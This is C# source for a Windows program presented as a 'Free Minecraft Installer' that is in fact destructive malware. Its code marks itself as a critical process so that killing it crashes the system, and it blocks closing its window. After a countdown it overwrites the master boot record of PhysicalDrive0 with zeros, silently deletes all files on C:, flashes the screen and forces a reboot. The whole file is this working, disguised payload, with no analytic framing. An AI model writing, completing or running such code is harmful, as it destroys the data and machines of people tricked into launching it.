using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FreeMinecraft_DBI_Project
{
    class Program : Form
    {
        // --- MBR DESTRUCTION (YOUR C++ LOGIC) ---
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        // --- ANTI-TERMINATION (BSOD ON KILL) ---
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        private System.Windows.Forms.Timer countdownTimer;
        private int timeLeft = 600; // 10 minutes
        private Label lblTimer;
        private Random rnd = new Random();

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            
            // Set process as critical (Causes BSOD if killed in Task Manager)
            try {
                int isCritical = 1;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            } catch { }

            Application.Run(new Program());
        }

        public Program()
        {
            this.Text = "Free Minecraft Installer";
            this.Size = new Size(800, 500);
            this.BackColor = Color.Black;
            this.ControlBox = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.FormClosing += (s, e) => { e.Cancel = true; }; // Blocks Alt+F4

            lblTimer = new Label() { 
                Text = "10:00", 
                Font = new Font("Consolas", 72, FontStyle.Bold), 
                ForeColor = Color.Red, 
                Dock = DockStyle.Fill, 
                TextAlign = ContentAlignment.MiddleCenter 
            };
            this.Controls.Add(lblTimer);

            countdownTimer = new System.Windows.Forms.Timer() { Interval = 1000 };
            countdownTimer.Tick += (s, e) => {
                if (timeLeft > 0) {
                    timeLeft--;
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss");
                } else {
                    countdownTimer.Stop();
                    ExecuteDestruction();
                }
            };
            countdownTimer.Start();
        }

        private void ExecuteDestruction()
        {
            MessageBox.Show("I give you a chances.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            this.WindowState = FormWindowState.Maximized;

            // 1. OVERWRITE MBR (Zeroing out sector 0)
            DestroyMBR();

            // 2. BACKGROUND FILE WIPING
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });

            // 3. THE "NICE SHOW" (Tunnels and Inversion)
            System.Windows.Forms.Timer showTimer = new System.Windows.Forms.Timer() { Interval = 30 };
            int f = 0;
            showTimer.Tick += (s, e) => {
                f++;
                IntPtr hdc = GetDC(IntPtr.Zero);
                int w = Screen.PrimaryScreen.Bounds.Width, h = Screen.PrimaryScreen.Bounds.Height;
                
                // Color Flashing/Inversion
                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, (f % 2 == 0) ? 0x00990066 : 0x00660044);

                // Drawing the pulsing tunnel
                using (Graphics g = Graphics.FromHdc(hdc)) {
                    Pen p = new Pen(Color.FromArgb(rnd.Next(255), 255, 255), 10);
                    int r = (f * 15) % (w / 2);
                    g.DrawEllipse(p, (w/2)-r, (h/2)-r, r*2, r*2);
                }
            };
            showTimer.Start();

            // 4. FORCED RESTART AFTER 5 MINUTES
            System.Windows.Forms.Timer restartTimer = new System.Windows.Forms.Timer() { Interval = 300000 };
            restartTimer.Tick += (s, e) => {
                Process.Start("shutdown", "/r /f /t 0");
            };
            restartTimer.Start();
        }

        private void DestroyMBR()
        {
            try {
                byte[] mbrData = new byte[512]; // Buffer of zeros
                uint written;
                // Accessing \\.\PhysicalDrive0 directly
                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(drive, mbrData, 512, out written, IntPtr.Zero);
            } catch { }
        }
    }
}
